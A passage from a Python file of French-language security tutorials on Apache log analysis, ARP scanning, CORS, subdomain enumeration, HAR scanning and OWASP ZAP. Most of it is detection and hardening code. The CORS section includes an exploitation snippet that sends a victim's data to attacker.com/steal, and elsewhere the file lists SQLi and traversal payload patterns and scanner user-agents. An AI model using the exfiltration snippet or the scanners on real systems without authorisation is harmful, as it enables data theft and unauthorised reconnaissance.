L'analyse des **logs Apache** permet de détecter les attaques, surveiller le trafic et identifier les comportements anormaux.

### Types de logs

- **access.log** : Toutes les requêtes HTTP
- **error.log** : Erreurs et avertissements
- **ssl_access.log** : Trafic HTTPS
""",
        "theory": """
## Théorie et Concepts

### Format Combined Log

```
192.168.1.100 - admin [10/Oct/2024:13:55:36 -0700] "GET /admin HTTP/1.1" 200 2326 "http://example.com" "Mozilla/5.0"
└─────┬─────┘ ├┘└──┬─┘ └─────────────┬──────────────┘ └────────────┬────────────┘ └┬┘ └─┬┘ └───────┬──────────┘ └─────────┬──────────┘
      │       │    │                 │                              │               │    │         │                      │
   IP client  │ user           timestamp                         request         status size    referer              user-agent
           ident
```

### Patterns d'attaque

| Pattern | Description | Exemple |
|---------|-------------|---------|
| SQL Injection | Tentatives SQLi | `UNION SELECT`, `' OR 1=1` |
| Path Traversal | Accès fichiers | `../../../etc/passwd` |
| Scanner | Enumération | 100+ requêtes/min |
| Brute Force | Auth répétée | 401 répétés |
| XSS | Injection script | `<script>`, `onerror=` |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Parser les logs

```python
import re
from datetime import datetime
from collections import defaultdict

LOG_PATTERN = re.compile(
    r'(?P<ip>\S+) \S+ (?P<user>\S+) '
    r'\[(?P<time>[^\]]+)\] '
    r'"(?P<method>\S+) (?P<path>\S+) (?P<protocol>[^"]+)" '
    r'(?P<status>\d+) (?P<size>\S+) '
    r'"(?P<referer>[^"]*)" "(?P<agent>[^"]*)"'
)

def parse_log_line(line):
    match = LOG_PATTERN.match(line)
    if match:
        data = match.groupdict()
        data['time'] = datetime.strptime(
            data['time'], '%d/%b/%Y:%H:%M:%S %z'
        )
        data['status'] = int(data['status'])
        data['size'] = int(data['size']) if data['size'] != '-' else 0
        return data
    return None

def parse_log_file(filepath):
    entries = []
    with open(filepath, 'r') as f:
        for line in f:
            entry = parse_log_line(line)
            if entry:
                entries.append(entry)
    return entries
```

### 2. Détection d'anomalies

```python
SQLI_PATTERNS = [
    r"('|")(\s)*(or|and)(\s)+",
    r"union(\s)+select",
    r"(\%27|\').*?--",
    r"exec(\s|\+)+(s|x)p\w+",
]

TRAVERSAL_PATTERNS = [
    r"\.\./",
    r"\.\.\\",
    r"%2e%2e[%2f\\]",
]

def detect_attacks(entries):
    attacks = []

    for entry in entries:
        path = entry['path'].lower()

        # SQL Injection
        for pattern in SQLI_PATTERNS:
            if re.search(pattern, path, re.I):
                attacks.append({
                    'type': 'SQLi',
                    'ip': entry['ip'],
                    'path': entry['path'],
                    'time': entry['time']
                })
                break

        # Path Traversal
        for pattern in TRAVERSAL_PATTERNS:
            if re.search(pattern, path, re.I):
                attacks.append({
                    'type': 'Traversal',
                    'ip': entry['ip'],
                    'path': entry['path'],
                    'time': entry['time']
                })
                break

    return attacks
```

### 3. Analyse des scanners

```python
def detect_scanners(entries, threshold=100, window_minutes=5):
    from collections import defaultdict

    requests_per_ip = defaultdict(list)

    for entry in entries:
        requests_per_ip[entry['ip']].append(entry['time'])

    scanners = []

    for ip, times in requests_per_ip.items():
        times.sort()

        for i, t in enumerate(times):
            window_end = t + timedelta(minutes=window_minutes)
            count = sum(1 for x in times[i:] if x <= window_end)

            if count >= threshold:
                scanners.append({
                    'ip': ip,
                    'count': count,
                    'start': t
                })
                break

    return scanners
```

### 4. Rapport automatisé

```python
def generate_report(log_file):
    entries = parse_log_file(log_file)

    # Stats générales
    total = len(entries)
    status_counts = defaultdict(int)
    ip_counts = defaultdict(int)

    for e in entries:
        status_counts[e['status']] += 1
        ip_counts[e['ip']] += 1

    # Top IPs
    top_ips = sorted(ip_counts.items(), key=lambda x: -x[1])[:10]

    # Détection
    attacks = detect_attacks(entries)
    scanners = detect_scanners(entries)

    print(f"=== Rapport d'analyse ===")
    print(f"Total requêtes: {total}")
    print(f"\nStatus codes:")
    for status, count in sorted(status_counts.items()):
        print(f"  {status}: {count}")

    print(f"\nTop 10 IPs:")
    for ip, count in top_ips:
        print(f"  {ip}: {count}")

    print(f"\nAttaques détectées: {len(attacks)}")
    print(f"Scanners détectés: {len(scanners)}")
```
""",
        "best_practices": """
## Bonnes Pratiques

### Rotation des logs

```bash
# /etc/logrotate.d/apache2
/var/log/apache2/*.log {
    daily
    rotate 14
    compress
    delaycompress
    notifempty
    create 640 root adm
    postrotate
        /etc/init.d/apache2 reload > /dev/null
    endscript
}
```

### Centralisation

```bash
# Envoyer à un SIEM
# /etc/rsyslog.d/apache.conf
module(load="imfile")
input(type="imfile"
      File="/var/log/apache2/access.log"
      Tag="apache-access"
      Severity="info")

*.* @@siem.example.com:514
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Ignorer les User-Agents

```python
# Les scanners automatisés ont souvent des UA suspects
SUSPICIOUS_UA = [
    'sqlmap', 'nikto', 'nmap', 'masscan',
    'python-requests', 'curl', 'wget'
]
```
""",
        "tools": """
## Outils

- **GoAccess** : Analyseur temps réel
- **AWStats** : Statistiques web
- **Logwatch** : Rapports quotidiens
- **Graylog/ELK** : SIEM open source
""",
        "references": """
## Références

- [Apache Log Files](https://httpd.apache.org/docs/2.4/logs.html)
- [Log Analysis Best Practices](https://www.loggly.com/ultimate-guide/apache-logging-basics/)
""",
    },

    "Python.Arping": {
        "title": """ARP Ping et Découverte Réseau""",
        "intro": """
## Introduction

**ARP Ping** utilise le protocole ARP pour découvrir les hôtes sur un réseau local, contournant les firewalls qui bloquent ICMP.

### Avantages sur ICMP

- Fonctionne même si ICMP est bloqué
- Découvre les machines "silencieuses"
- Collecte les adresses MAC
- Plus rapide sur les réseaux locaux
""",
        "theory": """
## Théorie et Concepts

### Fonctionnement ARP

```
┌──────────────┐                    ┌──────────────┐
│   Scanner    │                    │    Cible     │
│ 192.168.1.10 │                    │ 192.168.1.20 │
└──────┬───────┘                    └──────┬───────┘
       │                                   │
       │  ARP Request (broadcast)          │
       │  "Who has 192.168.1.20?"          │
       │──────────────────────────────────►│
       │                                   │
       │  ARP Reply (unicast)              │
       │  "192.168.1.20 is at AA:BB:CC..." │
       │◄──────────────────────────────────│
```

### Table ARP

```bash
# Afficher la table ARP
arp -a
ip neigh show

# Format
IP              MAC                 Interface
192.168.1.1     aa:bb:cc:dd:ee:ff   eth0
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. ARP Ping avec Scapy

```python
from scapy.all import *

def arp_ping(ip):
    # Créer la requête ARP
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    # Envoyer et recevoir
    answered, _ = srp(packet, timeout=2, verbose=False)

    if answered:
        for sent, received in answered:
            return {
                'ip': received.psrc,
                'mac': received.hwsrc
            }
    return None

# Test
result = arp_ping("192.168.1.1")
if result:
    print(f"Host up: {result['ip']} ({result['mac']})")
```

### 2. Scanner de réseau complet

```python
from scapy.all import *
from ipaddress import ip_network
from concurrent.futures import ThreadPoolExecutor
import time

def arp_scan(network, timeout=2):
    # Créer les paquets pour tout le réseau
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(network))

    answered, _ = srp(arp_request, timeout=timeout, verbose=False)

    hosts = []
    for sent, received in answered:
        hosts.append({
            'ip': received.psrc,
            'mac': received.hwsrc,
            'vendor': get_vendor(received.hwsrc)
        })

    return sorted(hosts, key=lambda x: ip_address(x['ip']))

def get_vendor(mac):
    # Les 3 premiers octets = OUI
    oui = mac[:8].upper().replace(':', '')
    # Lookup dans une base OUI (simplifié)
    vendors = {
        'AABBCC': 'Cisco',
        '001122': 'Apple',
        # ... base complète
    }
    return vendors.get(oui, 'Unknown')

# Scanner le réseau
hosts = arp_scan("192.168.1.0/24")
for h in hosts:
    print(f"{h['ip']:15} {h['mac']}  {h['vendor']}")
```

### 3. Monitoring continu

```python
from scapy.all import *
import time
from datetime import datetime

known_hosts = {}

def arp_monitor(interface="eth0"):
    def process_arp(pkt):
        if ARP in pkt and pkt[ARP].op == 2:  # ARP Reply
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc

            if ip not in known_hosts:
                known_hosts[ip] = mac
                print(f"[NEW] {datetime.now()} - {ip} ({mac})")
            elif known_hosts[ip] != mac:
                print(f"[ALERT] MAC changed for {ip}")
                print(f"  Old: {known_hosts[ip]}")
                print(f"  New: {mac}")
                known_hosts[ip] = mac

    print(f"Monitoring ARP sur {interface}...")
    sniff(iface=interface, filter="arp", prn=process_arp, store=False)

arp_monitor()
```

### 4. Détection ARP Spoofing

```python
def detect_arp_spoof(interface="eth0"):
    gateway_ip = "192.168.1.1"  # À adapter
    gateway_mac = None

    def check_arp(pkt):
        nonlocal gateway_mac

        if ARP in pkt and pkt[ARP].op == 2:
            if pkt[ARP].psrc == gateway_ip:
                current_mac = pkt[ARP].hwsrc

                if gateway_mac is None:
                    gateway_mac = current_mac
                    print(f"Gateway MAC: {gateway_mac}")
                elif current_mac != gateway_mac:
                    print(f"[SPOOFING] Gateway MAC changed!")
                    print(f"  Expected: {gateway_mac}")
                    print(f"  Received: {current_mac}")

    sniff(iface=interface, filter="arp", prn=check_arp, store=False)
```
""",
        "best_practices": """
## Bonnes Pratiques

### Optimisation des scans

```python
# Scanner en parallèle pour les grands réseaux
def fast_arp_scan(network, workers=100):
    from concurrent.futures import ThreadPoolExecutor

    ips = [str(ip) for ip in ip_network(network).hosts()]

    with ThreadPoolExecutor(max_workers=workers) as executor:
        results = list(executor.map(arp_ping, ips))

    return [r for r in results if r is not None]
```

### Gestion des permissions

```python
import os, sys

if os.geteuid() != 0:
    sys.exit("Ce script nécessite root (pour les raw sockets)")
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Scan trop agressif

```python
# MAUVAIS : flood le réseau
for ip in ips:
    srp(arp_request, timeout=0.01)

# BON : avec rate limiting
for ip in ips:
    srp(arp_request, timeout=1, inter=0.1)
```
""",
        "tools": """
## Outils alternatifs

```bash
# arping (Linux)
arping -c 1 192.168.1.1

# nmap ARP scan
nmap -sn -PR 192.168.1.0/24

# arp-scan
arp-scan --localnet
```
""",
        "references": """
## Références

- [RFC 826 - ARP](https://tools.ietf.org/html/rfc826)
- [Scapy ARP](https://scapy.readthedocs.io/en/latest/usage.html#arp-ping)
""",
    },

    "Python.CORS.Handler": {
        "title": """CORS - Cross-Origin Resource Sharing""",
        "intro": """
## Introduction

**CORS (Cross-Origin Resource Sharing)** est un mécanisme de sécurité du navigateur qui contrôle les requêtes HTTP cross-origin. Une mauvaise configuration CORS peut exposer des APIs à des attaques.

### Qu'est-ce qu'une origine ?

```
https://example.com:443/path
└─┬─┘   └────┬────┘└─┬┘
scheme    host     port
```

Deux URLs ont la même origine si scheme, host ET port sont identiques.
""",
        "theory": """
## Théorie et Concepts

### Fonctionnement de CORS

```
1. Requête simple (GET/POST avec Content-Type standard)
   Browser → Server: GET /api/data
   Server → Browser: Access-Control-Allow-Origin: *

2. Requête préflight (PUT/DELETE/custom headers)
   Browser → Server: OPTIONS /api/data
   Server → Browser: Access-Control-Allow-Methods: PUT, DELETE
   Browser → Server: PUT /api/data (si autorisé)
```

### Headers CORS importants

| Header | Description |
|--------|-------------|
| `Access-Control-Allow-Origin` | Origines autorisées |
| `Access-Control-Allow-Credentials` | Autorise cookies |
| `Access-Control-Allow-Methods` | Méthodes HTTP permises |
| `Access-Control-Allow-Headers` | Headers custom permis |
| `Access-Control-Expose-Headers` | Headers lisibles par JS |

### Configurations dangereuses

```python
# DANGER : Accepte toutes les origines AVEC credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# ↑ Navigateurs bloquent cette combo, mais...

# DANGER : Reflète l'origine sans validation
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin
response.headers['Access-Control-Allow-Credentials'] = 'true'
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration CORS sécurisée (Flask)

```python
from flask import Flask, request
from functools import wraps

app = Flask(__name__)

ALLOWED_ORIGINS = {
    'https://app.example.com',
    'https://admin.example.com',
}

def cors_handler(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        origin = request.headers.get('Origin')

        # Vérifier si l'origine est autorisée
        if origin in ALLOWED_ORIGINS:
            response = f(*args, **kwargs)
            response.headers['Access-Control-Allow-Origin'] = origin
            response.headers['Access-Control-Allow-Credentials'] = 'true'
            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
            return response

        return f(*args, **kwargs)
    return decorated

@app.route('/api/data', methods=['GET', 'OPTIONS'])
@cors_handler
def api_data():
    if request.method == 'OPTIONS':
        return '', 204
    return {'data': 'sensitive'}
```

### 2. Test de misconfiguration CORS

```python
import requests

def test_cors_misconfig(url):
    test_origins = [
        'https://evil.com',
        'https://attacker.com',
        'null',
        'https://example.com.evil.com',  # Subdomain trick
    ]

    for origin in test_origins:
        headers = {'Origin': origin}
        r = requests.get(url, headers=headers)

        acao = r.headers.get('Access-Control-Allow-Origin', '')
        acac = r.headers.get('Access-Control-Allow-Credentials', '')

        if origin in acao or acao == '*':
            vuln = 'CRITICAL' if acac == 'true' else 'MEDIUM'
            print(f"[{vuln}] Origin '{origin}' reflected")
            print(f"  ACAO: {acao}")
            print(f"  ACAC: {acac}")

# test_cors_misconfig('https://api.target.com/user/profile')
```

### 3. Exploitation CORS

```html
<!-- Page de l'attaquant -->
<script>
fetch('https://vulnerable-api.com/user/data', {
    credentials: 'include'  // Envoie les cookies
})
.then(r => r.json())
.then(data => {
    // Exfiltrer les données
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```
""",
        "best_practices": """
## Bonnes Pratiques

### Whitelist stricte

```python
# Validation avec regex pour sous-domaines
import re

ORIGIN_PATTERN = re.compile(
    r'^https://([a-z0-9-]+\.)?example\.com$'
)

def is_valid_origin(origin):
    return bool(ORIGIN_PATTERN.match(origin))
```

### Headers de sécurité complémentaires

```python
@app.after_request
def security_headers(response):
    # Empêcher le framing
    response.headers['X-Frame-Options'] = 'DENY'

    # Politique de contenu
    response.headers['Content-Security-Policy'] = "default-src 'self'"

    # Pas de sniffing MIME
    response.headers['X-Content-Type-Options'] = 'nosniff'

    return response
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Reflection d'origine

```python
# MAUVAIS
@app.after_request
def cors(response):
    response.headers['ACAO'] = request.headers.get('Origin')
    return response

# BON
@app.after_request
def cors(response):
    origin = request.headers.get('Origin')
    if origin in WHITELIST:
        response.headers['ACAO'] = origin
    return response
```

### ❌ Wildcard avec credentials

```python
# INTERDIT par les navigateurs mais parfois tenté
headers['Access-Control-Allow-Origin'] = '*'
headers['Access-Control-Allow-Credentials'] = 'true'
```
""",
        "tools": """
## Outils

### CORScanner

```bash
python cors_scan.py -u https://target.com/api/
```

### Burp Suite

1. Proxy > Options > Match and Replace
2. Ajouter un header Origin malveillant
3. Observer les réponses ACAO
""",
        "references": """
## Références

- [MDN CORS](https://developer.mozilla.org/fr/docs/Web/HTTP/CORS)
- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [OWASP CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
""",
    },

    "Python.Dome.SubDomains": {
        "title": """Enumération de Sous-domaines""",
        "intro": """
## Introduction

L'**énumération de sous-domaines** est une technique de reconnaissance essentielle pour identifier la surface d'attaque d'une cible.

### Méthodes

- **Brute force** : Tester des mots communs
- **Passive** : Certificate Transparency, DNS, archives
- **Active** : DNS zone transfer, virtual hosts
""",
        "theory": """
## Théorie et Concepts

### Sources d'information

| Source | Type | Description |
|--------|------|-------------|
| DNS Brute force | Actif | Résolution de noms |
| Certificate Transparency | Passif | Logs de certificats SSL |
| VirusTotal | Passif | Base de données DNS |
| Shodan | Passif | Scans internet |
| Archive.org | Passif | Pages archivées |
| Google dorks | Passif | Indexation moteurs |

### Enregistrements DNS utiles

```
A     → IPv4
AAAA  → IPv6
CNAME → Alias
MX    → Serveurs mail
NS    → Serveurs DNS
TXT   → Informations diverses
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Brute force DNS

```python
import dns.resolver
from concurrent.futures import ThreadPoolExecutor

def check_subdomain(domain, subdomain):
    target = f"{subdomain}.{domain}"
    try:
        answers = dns.resolver.resolve(target, 'A')
        ips = [str(rdata) for rdata in answers]
        return {'subdomain': target, 'ips': ips}
    except:
        return None

def bruteforce_subdomains(domain, wordlist, workers=50):
    results = []

    with open(wordlist, 'r') as f:
        words = [w.strip() for w in f if w.strip()]

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [
            executor.submit(check_subdomain, domain, word)
            for word in words
        ]

        for future in futures:
            result = future.result()
            if result:
                results.append(result)
                print(f"[+] {result['subdomain']} → {result['ips']}")

    return results

# Utilisation
subdomains = bruteforce_subdomains("example.com", "subdomains.txt")
```

### 2. Certificate Transparency

```python
import requests

def get_ct_subdomains(domain):
    url = f"https://crt.sh/?q=%.{domain}&output=json"

    try:
        r = requests.get(url, timeout=30)
        data = r.json()

        subdomains = set()
        for entry in data:
            name = entry.get('name_value', '')
            for sub in name.split('\n'):
                sub = sub.strip().lower()
                if sub.endswith(domain) and '*' not in sub:
                    subdomains.add(sub)

        return sorted(subdomains)

    except Exception as e:
        print(f"Erreur CT: {e}")
        return []

# Utilisation
subs = get_ct_subdomains("example.com")
for s in subs:
    print(s)
```

### 3. Combinaison de sources

```python
import requests

class SubdomainEnumerator:
    def __init__(self, domain):
        self.domain = domain
        self.subdomains = set()

    def crtsh(self):
        url = f"https://crt.sh/?q=%.{self.domain}&output=json"
        try:
            r = requests.get(url, timeout=30)
            for entry in r.json():
                for name in entry.get('name_value', '').split('\n'):
                    name = name.strip().lower()
                    if name.endswith(self.domain):
                        self.subdomains.add(name.replace('*.', ''))
        except:
            pass

    def threatcrowd(self):
        url = f"https://threatcrowd.org/searchApi/v2/domain/report/?domain={self.domain}"
        try:
            r = requests.get(url, timeout=30)
            for sub in r.json().get('subdomains', []):
                self.subdomains.add(sub.lower())
        except:
            pass

    def hackertarget(self):
        url = f"https://api.hackertarget.com/hostsearch/?q={self.domain}"
        try:
            r = requests.get(url, timeout=30)
            for line in r.text.splitlines():
                if ',' in line:
                    subdomain = line.split(',')[0]
                    self.subdomains.add(subdomain.lower())
        except:
            pass

    def enumerate_all(self):
        print(f"[*] Enumération de {self.domain}")

        print("[*] Certificate Transparency...")
        self.crtsh()

        print("[*] ThreatCrowd...")
        self.threatcrowd()

        print("[*] HackerTarget...")
        self.hackertarget()

        print(f"[+] {len(self.subdomains)} sous-domaines trouvés")
        return sorted(self.subdomains)

# Utilisation
enum = SubdomainEnumerator("example.com")
results = enum.enumerate_all()
```

### 4. Vérification des résultats

```python
import dns.resolver
import socket

def verify_subdomains(subdomains):
    verified = []

    for sub in subdomains:
        try:
            answers = dns.resolver.resolve(sub, 'A')
            ips = [str(r) for r in answers]

            # Vérifier si le port 80/443 répond
            for ip in ips:
                try:
                    socket.create_connection((ip, 443), timeout=2)
                    https = True
                except:
                    https = False

            verified.append({
                'subdomain': sub,
                'ips': ips,
                'https': https
            })
            print(f"[LIVE] {sub} → {ips}")

        except dns.resolver.NXDOMAIN:
            pass
        except Exception as e:
            pass

    return verified
```
""",
        "best_practices": """
## Bonnes Pratiques

### Wordlists efficaces

```bash
# SecLists
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

# Génération custom
# Combinaisons communes
dev, staging, test, prod, api, admin, www, mail, ftp, vpn
```

### Rate limiting

```python
import time

def polite_enumerate(domain, words):
    for word in words:
        check_subdomain(domain, word)
        time.sleep(0.1)  # 10 req/sec max
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Wildcard DNS

```python
# Vérifier si wildcard existe
def check_wildcard(domain):
    random_sub = f"thissubshouldnotexist12345.{domain}"
    try:
        dns.resolver.resolve(random_sub, 'A')
        return True  # Wildcard actif
    except:
        return False
```
""",
        "tools": """
## Outils

```bash
# Subfinder
subfinder -d example.com

# Amass
amass enum -d example.com

# Sublist3r
sublist3r -d example.com
```
""",
        "references": """
## Références

- [OWASP Subdomain Enumeration](https://owasp.org/www-community/attacks/Subdomain_Enumeration)
- [Certificate Transparency](https://certificate.transparency.dev/)
""",
    },

    "Python.HAR.Scanner": {
        "title": """Scanner de Fichiers HAR""",
        "intro": """
## Introduction

Les fichiers **HAR (HTTP Archive)** capturent tout le trafic HTTP d'une session de navigation. L'analyse permet de détecter des fuites de données et problèmes de sécurité.

### Contenus sensibles à rechercher

- Tokens d'authentification
- Mots de passe
- Données personnelles
- Clés API
""",
        "theory": """
## Théorie et Concepts

### Structure HAR

```json
{
  "log": {
    "entries": [
      {
        "request": {
          "url": "...",
          "headers": [...],
          "postData": {...}
        },
        "response": {
          "status": 200,
          "headers": [...],
          "content": {...}
        }
      }
    ]
  }
}
```

### Données à risque

| Type | Pattern | Risque |
|------|---------|--------|
| JWT | eyJ... | Session hijacking |
| API Key | key=xxx | Accès non autorisé |
| Password | password= | Credential theft |
| Credit Card | \d{16} | Fraude |
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Parser et analyser

```python
import json
import re
from urllib.parse import parse_qs, urlparse

class HARScanner:
    PATTERNS = {
        'jwt': r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
        'api_key': r'["\'](api[_-]?key|apikey)["\']\s*[:=]\s*["\']([^"\'])+["\']]',
        'password': r'password["\'\s]*[:=]["\'\s]*([^"\'
&]+)',
        'credit_card': r'\b\d{13,16}\b',
        'email': r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
        'bearer': r'Bearer\s+[A-Za-z0-9_-]+',
    }

    def __init__(self, har_file):
        with open(har_file, 'r') as f:
            self.har = json.load(f)
        self.findings = []

    def scan(self):
        for entry in self.har['log']['entries']:
            self._scan_request(entry['request'])
            self._scan_response(entry['response'])
        return self.findings

    def _scan_request(self, request):
        url = request['url']

        # Scan URL
        self._scan_text(url, f"URL: {url[:50]}...")

        # Scan headers
        for header in request.get('headers', []):
            self._scan_text(
                header['value'],
                f"Request Header {header['name']}: {url[:30]}..."
            )

        # Scan POST data
        if 'postData' in request:
            text = request['postData'].get('text', '')
            self._scan_text(text, f"POST body: {url[:30]}...")

    def _scan_response(self, response):
        # Scan response headers
        for header in response.get('headers', []):
            self._scan_text(
                header['value'],
                f"Response Header {header['name']}"
            )

        # Scan response body
        content = response.get('content', {})
        text = content.get('text', '')
        if text:
            self._scan_text(text, "Response body")

    def _scan_text(self, text, location):
        for pattern_name, pattern in self.PATTERNS.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            for match in matches:
                self.findings.append({
                    'type': pattern_name,
                    'match': match[:50] if isinstance(match, str) else str(match)[:50],
                    'location': location
                })

# Utilisation
scanner = HARScanner('capture.har')
findings = scanner.scan()

for f in findings:
    print(f"[{f['type']}] {f['match']} - {f['location']}")
```

### 2. Rapport de sécurité

```python
def generate_security_report(har_file):
    scanner = HARScanner(har_file)
    findings = scanner.scan()

    # Grouper par type
    by_type = {}
    for f in findings:
        if f['type'] not in by_type:
            by_type[f['type']] = []
        by_type[f['type']].append(f)

    # Générer rapport
    report = []
    report.append("# HAR Security Scan Report\n")

    if not findings:
        report.append("No sensitive data found.\n")
    else:
        report.append(f"Found {len(findings)} potential issues:\n")

        for ftype, items in by_type.items():
            report.append(f"\n## {ftype.upper()} ({len(items)} occurrences)\n")
            for item in items[:5]:  # Limiter l'affichage
                report.append(f"- {item['location']}")
                report.append(f"  Match: `{item['match']}`\n")

    return '\n'.join(report)
```

### 3. Vérification des headers de sécurité

```python
def check_security_headers(har_file):
    with open(har_file, 'r') as f:
        har = json.load(f)

    REQUIRED_HEADERS = {
        'strict-transport-security': 'HSTS missing',
        'x-content-type-options': 'MIME sniffing possible',
        'x-frame-options': 'Clickjacking possible',
        'content-security-policy': 'XSS protection missing',
    }

    issues = []

    for entry in har['log']['entries']:
        url = entry['request']['url']
        headers = {h['name'].lower(): h['value']
                   for h in entry['response']['headers']}

        for header, message in REQUIRED_HEADERS.items():
            if header not in headers:
                issues.append({
                    'url': url,
                    'header': header,
                    'issue': message
                })

    return issues
```
""",
        "best_practices": """
## Bonnes Pratiques

### Anonymisation avant partage

```python
def anonymize_har(har_data):
    '''Supprime les données sensibles avant partage'''
    sensitive_headers = ['authorization', 'cookie', 'set-cookie']

    for entry in har_data['log']['entries']:
        # Anonymiser les headers
        for header in entry['request'].get('headers', []):
            if header['name'].lower() in sensitive_headers:
                header['value'] = '[REDACTED]'
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Faux positifs

```python
# Vérifier le contexte avant d'alerter
# "password" dans une URL de doc != mot de passe réel
```
""",
        "tools": """
## Outils

- **Chrome DevTools** : Export HAR
- **HAR Viewer** : Visualisation
- **mitmproxy** : Capture proxy
""",
        "references": """
## Références

- [HAR 1.2 Spec](http://www.softwareishard.com/blog/har-12-spec/)
""",
    },

    "Python.HAR.ZAP": {
        "title": """OWASP ZAP et Analyse HAR""",
        "intro": """
## Introduction

**OWASP ZAP** (Zed Attack Proxy) est un scanner de sécurité web open source. Les fichiers **HAR** (HTTP Archive) permettent d'exporter et analyser le trafic HTTP.

### Cas d'usage

- Scan automatisé de vulnérabilités
- Analyse de trafic HTTP/HTTPS
- Tests de pénétration web
- CI/CD security testing
""",
        "theory": """
## Théorie et Concepts

### Architecture ZAP

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   Browser   │────►│    ZAP      │────►│   Target    │
│             │◄────│   Proxy     │◄────│   Website   │
└─────────────┘     └─────────────┘     └─────────────┘
                          │
                    ┌─────┴─────┐
                    │  Scanners │
                    │  Spider   │
                    │  Fuzzer   │
                    └───────────┘
```

### Format HAR

```json
{
  "log": {
    "version": "1.2",
    "entries": [
      {
        "request": {
          "method": "GET",
          "url": "https://example.com/api",
          "headers": [...]
        },
        "response": {
          "status": 200,
          "content": {...}
        },
        "timings": {...}
      }
    ]
  }
}
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. API ZAP en Python

```python
from zapv2 import ZAPv2

# Connexion à ZAP (doit être lancé)
zap = ZAPv2(apikey='your-api-key',
            proxies={'http': 'http://127.0.0.1:8080'})

def scan_target(target_url):
    print(f"[*] Scanning {target_url}")

    # Spider (exploration)
    print("[*] Spidering...")
    scan_id = zap.spider.scan(target_url)
    while int(zap.spider.status(scan_id)) < 100:
        print(f"Spider progress: {zap.spider.status(scan_id)}%")
        time.sleep(5)

    # Active scan
    print("[*] Active scanning...")
    scan_id = zap.ascan.scan(target_url)
    while int(zap.ascan.status(scan_id)) < 100:
        print(f"Scan progress: {zap.ascan.status(scan_id)}%")
        time.sleep(10)

    # Récupérer les alertes
    alerts = zap.core.alerts(baseurl=target_url)
    return alerts

alerts = scan_target("https://example.com")
for alert in alerts:
    print(f"[{alert['risk']}] {alert['alert']}")
    print(f"  URL: {alert['url']}")
```

### 2. Analyse de fichier HAR

```python
import json
from collections import defaultdict

def analyze_har(har_file):
    with open(har_file, 'r') as f:
        har = json.load(f)

    entries = har['log']['entries']
    stats = {
        'total_requests': len(entries),
        'methods': defaultdict(int),
        'status_codes': defaultdict(int),
        'content_types': defaultdict(int),
        'domains': defaultdict(int),
        'slow_requests': [],
        'errors': []
    }

    for entry in entries:
        req = entry['request']
        resp = entry['response']

        # Stats
        stats['methods'][req['method']] += 1
        stats['status_codes'][resp['status']] += 1

        # Domaine
        from urllib.parse import urlparse
        domain = urlparse(req['url']).netloc
        stats['domains'][domain] += 1

        # Content-Type
        for header in resp.get('headers', []):
            if header['name'].lower() == 'content-type':
                ct = header['value'].split(';')[0]
                stats['content_types'][ct] += 1

        # Requêtes lentes (> 2s)
        time_ms = entry.get('time', 0)
        if time_ms > 2000:
            stats['slow_requests'].append({
                'url': req['url'],
                'time_ms': time_ms
            })

        # Erreurs
        if resp['status'] >= 400:
            stats['errors'].append({
                'url': req['url'],
                'status': resp['status']
            })

    return stats

# Utilisation
stats = analyze_har("traffic.har")
print(f"Total: {stats['total_requests']} requêtes")
print(f"Erreurs: {len(stats['errors'])}")
```

### 3. Détection de vulnérabilités

```python
def detect_security_issues(har_file):
    with open(har_file, 'r') as f:
        har = json.load(f)

    issues = []

    for entry in har['log']['entries']:
        url = entry['request']['url']
        headers = {h['name'].lower(): h['value']
                   for h in entry['response'].get('headers', [])}

        # Vérifier headers de sécurité manquants
        security_headers = [
            'strict-transport-security',
            'x-content-type-options',
            'x-frame-options',
            'content-security-policy'
        ]

        for header in security_headers:
            if header not in headers:
                issues.append({
                    'type': 'missing_header',
                    'header': header,
                    'url': url
                })

        # Cookies sans flags
        for header in entry['response'].get('headers', []):
            if header['name'].lower() == 'set-cookie':
                cookie = header['value'].lower()
                if 'secure' not in cookie:
                    issues.append({
                        'type': 'insecure_cookie',
                        'detail': 'Missing Secure flag',
                        'url': url
                    })
                if 'httponly' not in cookie:
                    issues.append({
                        'type': 'insecure_cookie',
                        'detail': 'Missing HttpOnly flag',
                        'url': url
                    })

    return issues
```

### 4. Export depuis ZAP

```python
def export_zap_to_har(zap, output_file):
    # Récupérer tout l'historique
    messages = zap.core.messages()

    har = {
        "log": {
            "version": "1.2",
            "creator": {"name": "ZAP", "version": "2.x"},
            "entries": []
        }
    }

    for msg in messages:
        entry = {
            "request": {
                "method": msg['requestHeader'].split()[0],
                "url": msg['requestHeader'].split()[1],
                "httpVersion": "HTTP/1.1",
                "headers": parse_headers(msg['requestHeader']),
                "postData": msg.get('requestBody', '')
            },
            "response": {
                "status": int(msg['responseHeader'].split()[1]),
